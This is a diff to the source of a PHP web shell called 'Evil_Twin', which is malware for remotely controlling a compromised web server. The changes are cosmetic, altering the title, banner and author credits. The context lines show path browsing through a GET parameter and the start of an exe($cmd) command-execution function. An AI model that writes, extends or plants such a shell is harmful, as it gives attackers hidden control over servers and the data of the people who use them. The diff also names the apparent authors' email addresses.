@@ -40,7 +40,7 @@ echo '<!DOCTYPE HTML>
 <head>
 <meta name="robots" content"noindex. nofollow">
 <meta name="theme-color" content="#434343">
-<title>Evil_Twin</title>
+<title>• Evil_Twin •</title>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Play&display:swap;" type="text/css">
 <link rel="icon" href="https://i.ibb.co/QjwrL9y/Sec666-Fadly31337.jpg" type="image/jpeg">
 <style>
@@ -88,7 +88,7 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<center><span class="we"><a href="mailto:fadly.randovlsky@gmail.com">EVIL TWIN</a></span></center>
+<center><span class="we"><a href="mailto:fadly.randovlsky@gmail.com">• EVIL TWIN SHELL •</a></span></center>
 <table width="780" border="0" cellpadding="3" cellspacing="1" align="center">
 <center><tr><td><font>Path :</font> ';
 if(isset($_GET['path'])){
@@ -347,7 +347,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo "<br><center><a href='mailto:zsec@gmx.com'>Sec666</a> - <a href='mailto:fadly.randovlsky@gmail.com'>Fadly31337</a></center>
+echo "<br><center><a href='mailto:zsec@gmx.com'>Sec666host</a> - <a href='mailto:fadly.randovlsky@gmail.com'>Fadly31337</a></center>
 </body>
 </html>";
 function exe($cmd) { 	
